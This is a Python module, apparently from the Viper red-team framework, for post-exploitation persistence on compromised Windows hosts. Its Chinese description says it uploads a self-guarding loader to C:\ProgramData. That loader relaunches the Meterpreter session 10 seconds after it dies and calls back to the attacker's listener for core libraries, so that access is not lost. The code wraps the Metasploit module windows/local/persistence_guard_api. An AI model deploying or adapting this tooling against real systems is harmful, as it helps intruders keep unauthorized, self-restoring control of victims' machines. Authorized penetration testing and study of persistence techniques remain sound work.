# -*- coding: utf-8 -*-

from Lib.ModuleAPI import *


class PostModule(PostMSFRawModule):
    NAME = "Windows自守护Session"
    DESC = "模块上传带有守护自身功能的加载器到主机指定目录(C:\ProgramData\XXX).\n" \
           "当前生成的Session进程崩溃或退出时会在10s后自动重新启动.\n" \
           "主要用于生成备用Session,防止初始权限丢失.\n" \
           "建议在取得第一个Session后马上运行此模块,确保权限不丢失\n" \
           "使用模块时请勿关闭对应监听,Loader启动需要回连监听获取核心库文件."
    REQUIRE_SESSION = True
    MODULETYPE = TAG2CH.Persistence
    PLATFORM = ["Windows"]  # 平台
    PERMISSIONS = ["User", "Administrator", "SYSTEM"]  # 所需权限
    ATTCK = ["T1050"]  # ATTCK向量
    AUTHOR = "Viper"
    README = ["https://www.yuque.com/vipersec/module/pixh1u"]
    REFERENCES = ["https://attack.mitre.org/techniques/T1050/"]
    OPTIONS = register_options([
        OptionHander(),
        OptionCacheHanderConfig(),
    ])

    def __init__(self, sessionid, ipaddress, custom_param):
        super().__init__(sessionid, ipaddress, custom_param)
        self.type = "exploit"
        self.mname = "windows/local/persistence_guard_api"

    def check(self):
        """执行前的检查函数"""
        # from PostModule.lib.Session import Session
        self.set_option(key="GUARD", value=True)
        session = Session(self._sessionid)
        if session.is_windows:
            pass
        else:
            return False, "此模块只支持Meterpreter类型的Session"

        self.set_payload_by_handler()
        if 'windows' not in self.opts.get('PAYLOAD').lower():
            return False, "选择handler错误,建议选择windows平台的handler"

        return True, None

    def callback(self, status, message, data):
        # 调用父类函数存储结果(必须调用)
        if status:
            self.log_good("模块执行成功")
            self.log_good("EXE路径: {}".format(data.get("path")))
            self.cache_handler()
        else:
            self.log_error("模块执行失败")
            self.log_error(message)
